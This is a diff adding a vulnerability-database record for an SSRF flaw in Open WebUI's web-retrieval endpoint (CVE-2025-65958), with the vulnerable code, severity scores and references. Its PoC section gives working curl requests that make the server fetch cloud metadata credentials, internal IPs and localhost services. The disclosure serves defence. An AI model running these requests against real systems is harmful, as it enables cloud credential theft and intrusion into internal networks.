@@ -1,0 +1,191 @@
+vulnerability_id: VCID-rdh4-wufm-wfhn
+aliases:
+  - CVE-2025-65958
+  - GHSA-c6xv-rcvw-v685
+summary: |
+  Open WebUI vulnerable to Server-Side Request Forgery (SSRF) via Arbitrary URL Processing in /api/v1/retrieval/process/web
+  ### Summary
+  A Server-Side Request Forgery (SSRF) vulnerability in Open WebUI allows any authenticated user to force the server to make HTTP requests to arbitrary URLs. This can be exploited to access cloud metadata endpoints (AWS/GCP/Azure), scan internal networks, access internal services behind firewalls, and exfiltrate sensitive information. No special permissions beyond basic authentication are required.
+
+
+  ### Details
+  The vulnerability exists in the /api/v1/retrieval/process/web endpoint located in backend/open_webui/routers/retrieval.py at lines 1758-1767.
+
+    Vulnerable code:
+    @router.post("/process/web")
+    def process_web(
+        request: Request, form_data: ProcessUrlForm, user=Depends(get_verified_user)
+    ):
+        try:
+            collection_name = form_data.collection_name
+            if not collection_name:
+                collection_name = calculate_sha256_string(form_data.url)[:63]
+
+            content, docs = get_content_from_url(request, form_data.url)  # ← SSRF vulnerability
+
+  The form_data.url parameter is passed directly to get_content_from_url() without any validation. This function chain ultimately calls web loaders that fetch arbitrary URLs:
+
+    Call chain:
+    1. retrieval.py:1767 → get_content_from_url(request, form_data.url)
+    2. retrieval/utils.py:77 → get_loader(request, url)
+    3. retrieval/utils.py:62 → get_web_loader(url, ...) or YoutubeLoader(url, ...)
+    4. Both loaders fetch the user-supplied URL without validation
+
+    No validation is performed for:
+    - Private IP ranges (RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
+    - Localhost addresses (127.0.0.0/8)
+    - Cloud metadata endpoints (169.254.169.254, fd00:ec2::254)
+    - Protocol restrictions (file://, gopher://, etc.)
+    - Domain allowlisting
+
+
+  ### PoC
+  Prerequisites: Valid user account (any role)
+
+    Step 1 - Authenticate:
+    TOKEN=$(curl -s "http://localhost:3000/api/v1/auths/signin" \
+      -H 'Content-Type: application/json' \
+      -d '{"email":"user@example.com","password":"password"}' \
+      | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+    Step 2 - Basic SSRF Test (external URL):
+    curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'Content-Type: application/json' \
+      -d '{"url":"http://example.com"}'
+
+    Result: Server fetches example.com and returns its content, proving the vulnerability.
+
+    {
+      "status": true,
+      "file": {
+        "data": {
+          "content": "Example Domain This domain is for use in documentation..."
+        }
+      }
+    }
+
+    Step 3 - Advanced Attack (AWS metadata):
+    curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'Content-Type: application/json' \
+      -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+    Result: Server exposes cloud credentials if running on AWS/GCP/Azure.
+
+    Other attack examples:
+    - Internal network: {"url":"http://192.168.1.1"}
+    - Localhost services: {"url":"http://localhost:5432"}
+    - Internal APIs: {"url":"http://internal-api.local"}
+
+
+  ### Impact
+  Who is affected: All authenticated users (no special permissions required)
+
+    Attack capabilities:
+
+    1. Cloud Environment Compromise
+      - Steal AWS/GCP/Azure credentials via metadata endpoints
+      - Result: Full cloud account takeover
+    2. Internal Network Access
+      - Bypass firewalls to access internal services (databases, admin panels, APIs)
+      - Port scan and map internal infrastructure
+      - Result: Complete network visibility
+    3. Data Exfiltration
+      - Read internal documentation, configurations, secrets
+      - Access Kubernetes API servers
+      - Result: Credential theft, API key exposure
+severities:
+  - score: '0.00064'
+    scoring_system: epss
+    scoring_elements: '0.20429'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-65958
+  - score: '0.00064'
+    scoring_system: epss
+    scoring_elements: '0.20394'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-65958
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-c6xv-rcvw-v685
+  - score: '8.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://github.com/open-webui/open-webui
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-webui/open-webui
+  - score: '8.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-12-08T20:54:23Z/
+    published_at: None
+    url: https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774
+  - score: '8.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2025-12-08T20:54:23Z/
+    published_at: None
+    url: https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685
+  - score: '8.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-65958
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-65958
+weaknesses:
+  - CWE-1035
+  - CWE-937
+  - CWE-918
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-65958
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-webui/open-webui
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-65958
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-c6xv-rcvw-v685
+    reference_type:
+    reference_id: GHSA-c6xv-rcvw-v685
